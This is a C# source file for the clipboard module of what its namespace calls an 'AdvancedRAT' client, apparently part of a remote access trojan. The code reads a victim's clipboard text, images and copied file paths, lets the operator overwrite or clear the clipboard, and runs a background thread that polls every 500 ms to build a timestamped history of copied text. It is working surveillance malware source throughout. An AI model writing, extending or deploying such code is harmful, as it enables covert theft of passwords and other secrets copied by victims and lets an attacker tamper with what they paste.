using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;

namespace AdvancedRAT.Client.Handlers
{
    public class ClipboardHandler
    {
        private bool isMonitoring = false;
        private Thread monitorThread;
        private List<Dictionary<string, string>> clipboardHistory = new List<Dictionary<string, string>>();
        private string lastClipboardText = "";
        private const int MAX_HISTORY = 100;

        public async Task<object> GetClipboard()
        {
            try
            {
                object result = null;

                Thread staThread = new Thread(() =>
                {
                    try
                    {
                        if (Clipboard.ContainsText())
                        {
                            string text = Clipboard.GetText();
                            result = new 
                            { 
                                success = true, 
                                type = "text",
                                content = text,
                                length = text.Length
                            };
                        }
                        else if (Clipboard.ContainsImage())
                        {
                            Image image = Clipboard.GetImage();
                            using (MemoryStream ms = new MemoryStream())
                            {
                                image.Save(ms, ImageFormat.Png);
                                byte[] imageBytes = ms.ToArray();
                                string base64 = Convert.ToBase64String(imageBytes);

                                result = new 
                                { 
                                    success = true, 
                                    type = "image",
                                    content = base64,
                                    width = image.Width,
                                    height = image.Height,
                                    format = "png"
                                };
                            }
                        }
                        else if (Clipboard.ContainsFileDropList())
                        {
                            var files = Clipboard.GetFileDropList();
                            var fileList = new List<string>();
                            foreach (string file in files)
                            {
                                fileList.Add(file);
                            }

                            result = new 
                            { 
                                success = true, 
                                type = "files",
                                content = string.Join("\n", fileList),
                                files = fileList,
                                count = fileList.Count
                            };
                        }
                        else
                        {
                            result = new 
                            { 
                                success = true, 
                                type = "empty",
                                content = "",
                                message = "Clipboard is empty or contains unsupported format"
                            };
                        }
                    }
                    catch (Exception ex)
                    {
                        result = new { success = false, message = ex.Message };
                    }
                });

                staThread.SetApartmentState(ApartmentState.STA);
                staThread.Start();
                staThread.Join();

                return result ?? new { success = false, message = "Failed to get clipboard" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }

        public async Task<object> SetClipboard(string content, string type = "text")
        {
            try
            {
                bool success = false;

                Thread staThread = new Thread(() =>
                {
                    try
                    {
                        if (type == "text")
                        {
                            Clipboard.SetText(content);
                            success = true;
                        }
                        else if (type == "image")
                        {
                            byte[] imageBytes = Convert.FromBase64String(content);
                            using (MemoryStream ms = new MemoryStream(imageBytes))
                            {
                                Image image = Image.FromStream(ms);
                                Clipboard.SetImage(image);
                                success = true;
                            }
                        }
                    }
                    catch { }
                });

                staThread.SetApartmentState(ApartmentState.STA);
                staThread.Start();
                staThread.Join();

                return new 
                { 
                    success, 
                    message = success ? "Clipboard set successfully" : "Failed to set clipboard"
                };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }

        public async Task<object> StartMonitoring()
        {
            try
            {
                if (isMonitoring)
                {
                    return new { success = false, message = "Already monitoring" };
                }

                isMonitoring = true;
                clipboardHistory.Clear();
                lastClipboardText = "";

                monitorThread = new Thread(() =>
                {
                    while (isMonitoring)
                    {
                        try
                        {
                            Thread staThread = new Thread(() =>
                            {
                                try
                                {
                                    if (Clipboard.ContainsText())
                                    {
                                        string text = Clipboard.GetText();
                                        if (text != lastClipboardText)
                                        {
                                            lastClipboardText = text;
                                            AddToHistory("text", text);
                                        }
                                    }
                                }
                                catch { }
                            });

                            staThread.SetApartmentState(ApartmentState.STA);
                            staThread.Start();
                            staThread.Join();
                        }
                        catch { }

                        Thread.Sleep(500);
                    }
                });

                monitorThread.Start();

                return new { success = true, message = "Clipboard monitoring started" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }

        public async Task<object> StopMonitoring()
        {
            try
            {
                if (!isMonitoring)
                {
                    return new { success = false, message = "Not monitoring" };
                }

                isMonitoring = false;

                if (monitorThread != null && monitorThread.IsAlive)
                {
                    monitorThread.Join(2000);
                }

                return new { success = true, message = "Clipboard monitoring stopped" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }

        public async Task<object> GetHistory()
        {
            try
            {
                return new 
                { 
                    success = true, 
                    history = clipboardHistory,
                    count = clipboardHistory.Count
                };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }

        public async Task<object> ClearHistory()
        {
            try
            {
                clipboardHistory.Clear();
                lastClipboardText = "";

                return new { success = true, message = "Clipboard history cleared" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }

        public async Task<object> ClearClipboard()
        {
            try
            {
                bool success = false;

                Thread staThread = new Thread(() =>
                {
                    try
                    {
                        Clipboard.Clear();
                        success = true;
                    }
                    catch { }
                });

                staThread.SetApartmentState(ApartmentState.STA);
                staThread.Start();
                staThread.Join();

                return new 
                { 
                    success, 
                    message = success ? "Clipboard cleared" : "Failed to clear clipboard"
                };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }

        private void AddToHistory(string type, string content)
        {
            var entry = new Dictionary<string, string>
            {
                ["timestamp"] = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"),
                ["type"] = type,
                ["content"] = content.Length > 1000 ? content.Substring(0, 1000) + "..." : content,
                ["length"] = content.Length.ToString()
            };

            clipboardHistory.Insert(0, entry);

            if (clipboardHistory.Count > MAX_HISTORY)
            {
                clipboardHistory.RemoveAt(clipboardHistory.Count - 1);
            }
        }
    }
}
